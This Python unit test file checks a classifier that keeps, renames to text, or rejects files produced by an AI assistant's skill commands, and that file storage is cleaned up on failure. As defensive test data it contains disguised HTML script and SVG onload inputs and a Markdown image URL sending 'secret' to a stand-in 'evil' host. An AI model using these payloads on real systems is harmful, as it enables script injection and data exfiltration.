"""What a skill command wrote under ``out/`` becomes the person's files (ADR-327 lot 2).

A command's files are served from the API's own origin, so what they are is
decided HERE, by their name AND their first bytes — never by the command:

- a document or an image the product already shows keeps its type, once its
  content matches it;
- a page a skill wrote (Markdown, HTML, SVG…) comes back as TEXT: the viewer
  would render Markdown with remote images, and an HTML or SVG file served
  inline would run in LIA's origin;
- anything else is named and left out.
"""

from __future__ import annotations

import uuid
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from src.domains.attachments.models import AttachmentContentType, AttachmentOrigin
from src.domains.skills.command_bundle import OutputFile
from src.domains.skills.command_outputs import classify, deliver_outputs

pytestmark = pytest.mark.unit

_PNG = b"\x89PNG\r\n\x1a\n" + b"\0" * 8
_PDF = b"%PDF-1.7\n"
_ZIP = b"PK\x03\x04" + b"\0" * 8


class TestClassify:
    @pytest.mark.parametrize(
        ("name", "data", "stored", "mime", "origin"),
        [
            ("r.pdf", _PDF, "r.pdf", "application/pdf", AttachmentOrigin.GENERATED_DOCUMENT),
            (
                "deck.pptx",
                _ZIP,
                "deck.pptx",
                "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                AttachmentOrigin.GENERATED_DOCUMENT,
            ),
            ("t.csv", b"a,b\n", "t.csv", "text/csv", AttachmentOrigin.GENERATED_DOCUMENT),
            ("c.PNG", _PNG, "c.PNG", "image/png", AttachmentOrigin.GENERATED_IMAGE),
            ("n.md", b"# t", "n.md.txt", "text/plain", AttachmentOrigin.GENERATED_DOCUMENT),
            ("p.html", b"<b>", "p.html.txt", "text/plain", AttachmentOrigin.GENERATED_DOCUMENT),
            ("i.svg", b"<svg", "i.svg.txt", "text/plain", AttachmentOrigin.GENERATED_DOCUMENT),
        ],
    )
    def test_a_file_keeps_a_type_the_product_serves_safely(
        self, name: str, data: bytes, stored: str, mime: str, origin: AttachmentOrigin
    ) -> None:
        verdict = classify(OutputFile(name=name, data=data))
        assert not isinstance(verdict, str)
        assert (verdict.name, verdict.mime_type, verdict.origin) == (stored, mime, origin)

    @pytest.mark.parametrize(
        ("name", "data", "reason"),
        [
            ("a.exe", b"MZ", "type_not_allowed"),
            ("noext", b"x", "type_not_allowed"),
            # A page wearing an image's or a document's name.
            ("c.png", b"<html><script>", "content_mismatch"),
            ("r.pdf", b"<svg onload=x>", "content_mismatch"),
            ("d.docx", b"plain text", "content_mismatch"),
            ("e.pdf", b"", "empty"),
        ],
    )
    def test_anything_else_is_named_and_left_out(self, name: str, data: bytes, reason: str) -> None:
        assert classify(OutputFile(name=name, data=data)) == reason


class _Repo:
    created: list[dict[str, Any]] = []
    fail = False

    def __init__(self, db: Any) -> None:
        pass

    async def create(self, values: dict[str, Any]) -> Any:
        if _Repo.fail:
            raise RuntimeError("database down")
        _Repo.created.append(values)
        row = type("Row", (), {})()
        row.id = uuid.uuid4()
        row.expires_at = values["expires_at"]
        return row


class _Db:
    async def commit(self) -> None:
        pass


class _Context:
    async def __aenter__(self) -> _Db:
        return _Db()

    async def __aexit__(self, *exc: object) -> None:
        return None


@pytest.fixture()
def storage(tmp_path: Path) -> Iterator[Path]:
    _Repo.created, _Repo.fail = [], False
    from src.core.config import settings

    with (
        patch.object(settings, "attachments_storage_path", str(tmp_path)),
        patch("src.domains.skills.command_outputs.AttachmentRepository", _Repo),
        patch("src.domains.skills.command_outputs.get_db_context", _Context),
    ):
        yield tmp_path


_USER = uuid.UUID("11111111-1111-4111-8111-111111111111")
_CONVERSATION = "22222222-2222-4222-8222-222222222222"


class TestDeliver:
    async def test_every_kept_file_is_stored_filed_and_shown(self, storage: Path) -> None:
        with (
            patch("src.domains.skills.command_outputs.store_pending_document") as documents,
            patch("src.domains.skills.command_outputs.store_pending_image") as images,
        ):
            delivery = await deliver_outputs(
                [OutputFile("r.pdf", _PDF), OutputFile("c.png", _PNG), OutputFile("x.exe", b"MZ")],
                user_id=_USER,
                conversation_id=_CONVERSATION,
            )
        assert [(f.name, f.family) for f in delivery.delivered] == [
            ("r.pdf", "document"),
            ("c.png", "image"),
        ]
        assert delivery.skipped == (("x.exe", "type_not_allowed"),)
        pdf, png = _Repo.created
        assert pdf["origin"] == AttachmentOrigin.GENERATED_DOCUMENT.value
        assert pdf["content_type"] == AttachmentContentType.DOCUMENT
        assert (pdf["original_filename"], pdf["title"], pdf["mime_type"]) == (
            "r.pdf",
            "r.pdf",
            "application/pdf",
        )
        assert png["origin"] == AttachmentOrigin.GENERATED_IMAGE.value
        assert str(pdf["conversation_id"]) == _CONVERSATION
        assert pdf["expires_at"] is not None
        assert (storage / pdf["file_path"]).read_bytes() == _PDF
        # The pdf card opens in the browser's viewer; the markdown one as text.
        assert documents.call_args.args[1].doc_type == "pdf"
        assert images.call_args.args[0] == _CONVERSATION

    async def test_a_page_a_skill_wrote_is_shown_as_text(self, storage: Path) -> None:
        with (
            patch("src.domains.skills.command_outputs.store_pending_document") as documents,
            patch("src.domains.skills.command_outputs.store_pending_image"),
        ):
            await deliver_outputs(
                [OutputFile("notes.md", b"![x](https://evil/?q=secret)")],
                user_id=_USER,
                conversation_id=_CONVERSATION,
            )
        card = documents.call_args.args[1]
        assert (card.filename, card.doc_type) == ("notes.md.txt", "txt")

    async def test_a_cancelled_delivery_leaves_no_file_behind(self, storage: Path) -> None:
        import asyncio

        class _Cancelled(_Repo):
            async def create(self, values: dict[str, Any]) -> Any:
                raise asyncio.CancelledError

        with (
            patch("src.domains.skills.command_outputs.AttachmentRepository", _Cancelled),
            pytest.raises(asyncio.CancelledError),
        ):
            await deliver_outputs(
                [OutputFile("r.pdf", _PDF)], user_id=_USER, conversation_id=_CONVERSATION
            )
        assert not any(path.is_file() for path in storage.rglob("*"))

    async def test_nothing_is_left_on_disk_when_the_rows_cannot_be_written(
        self, storage: Path
    ) -> None:
        _Repo.fail = True
        with (
            patch("src.domains.skills.command_outputs.store_pending_document") as documents,
            patch("src.domains.skills.command_outputs.store_pending_image"),
        ):
            delivery = await deliver_outputs(
                [OutputFile("r.pdf", _PDF)], user_id=_USER, conversation_id=_CONVERSATION
            )
        assert delivery.delivered == ()
        assert delivery.skipped == (("r.pdf", "not_saved"),)
        assert not any(path.is_file() for path in storage.rglob("*"))
        documents.assert_not_called()
